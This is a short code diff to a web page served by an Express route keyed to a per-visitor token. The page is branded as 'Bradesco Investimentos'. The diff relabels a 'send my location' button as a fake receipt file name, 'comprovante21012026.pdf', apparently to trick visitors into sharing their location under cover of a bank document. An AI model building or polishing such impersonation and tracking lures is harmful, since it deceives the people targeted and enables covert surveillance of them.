@@ -54,9 +54,9 @@ app.get("/loc/:token", (req, res) => {
 </head>
 <body style="font-family:Arial; padding:16px; max-width:640px; margin:auto;">
   <h2>Bradesco Investimentos</h2>
-  <p>Toque no botão para abrir o comprovante</p>
+ # <p>Toque no botão para abrir o comprovante</p>
 
-  <button id="btn" style="padding:12px 16px; font-size:16px;">Enviar minha localização</button>
+  <button id="btn" style="padding:12px 16px; font-size:16px;">comprovante21012026.pdf</button>
   <pre id="out" style="margin-top:16px; white-space:pre-wrap;"></pre>
 
 <script>
